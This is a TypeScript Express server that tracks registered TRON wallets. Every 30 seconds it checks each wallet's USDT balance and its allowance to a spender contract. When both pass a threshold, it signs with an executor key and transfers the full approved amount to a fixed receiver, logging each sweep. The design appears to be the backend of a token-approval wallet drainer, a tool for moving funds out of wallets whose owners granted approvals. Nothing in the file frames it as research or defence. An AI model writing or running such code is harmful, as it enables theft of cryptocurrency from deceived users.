import express from 'express';
import cors from 'cors';
import { TronWeb } from 'tronweb';
import { config } from './config';
import { store } from './store';

const app = express();
app.use(cors());
app.use(express.json());
const tron = new TronWeb({ fullHost: config.fullHost, headers: config.apiKey ? { 'TRON-PRO-API-KEY': config.apiKey } : undefined });
const threshold = config.threshold;
const usdt = () => tron.contract().at(config.usdt);

function validAddress(address: string) { return Boolean(address && tron.isAddress(address)); }
async function checkWallet(address: string) {
  if (!config.usdt || !config.spender || !config.executorPrivateKey) return;
  const token = await usdt();
  const balance = BigInt(await token.balanceOf(address).call());
  const record = store.wallets.get(address);
  if (record) record.lastBalance = balance.toString();
  if (balance < threshold) return;
  const allowance = BigInt(await token.allowance(address, config.spender).call());
  if (allowance < threshold) return;
  const executor = new TronWeb({ fullHost: config.fullHost, privateKey: config.executorPrivateKey, headers: config.apiKey ? { 'TRON-PRO-API-KEY': config.apiKey } : undefined });
  const amount = balance < allowance ? balance : allowance;
  const id = `${address}-${Date.now()}`;
  try {
    const spender = await executor.contract().at(config.spender);
    const result = await spender.executeTransfer(address, amount.toString(), 1).send({ feeLimit: 100_000_000 });
    store.log({ id, wallet: address, amount: amount.toString(), receiverId: 1, status: 'confirmed', createdAt: new Date().toISOString() });
    console.info(`AllowanceSpender execution ${result}`);
  } catch (error) {
    store.log({ id, wallet: address, amount: amount.toString(), receiverId: 1, status: 'failed', createdAt: new Date().toISOString(), error: String(error) });
  }
}

app.get('/api/health', (_req, res) => res.json({ ok: true, network: process.env.TRON_NETWORK || 'shasta' }));
app.get('/api/wallets', (_req, res) => res.json([...store.wallets.values()]));
app.post('/api/wallets', (req, res) => { const address = String(req.body.address || ''); if (!validAddress(address)) return res.status(400).json({ error: 'Invalid TRON address' }); return res.status(201).json(store.add(address)); });
app.delete('/api/wallets/:address', (req, res) => res.json({ removed: store.remove(req.params.address) }));
app.get('/api/wallets/:address/status', async (req, res) => { if (!validAddress(req.params.address)) return res.status(400).json({ error: 'Invalid TRON address' }); await checkWallet(req.params.address); return res.json(store.wallets.get(req.params.address) || null); });
app.get('/api/transactions', (_req, res) => res.json(store.transactions));

setInterval(() => Promise.all([...store.wallets.values()].filter((wallet) => wallet.status === 'active').map((wallet) => checkWallet(wallet.address).catch(console.error))), 30_000);
app.listen(config.port, () => console.log(`API listening on http://localhost:${config.port}`));
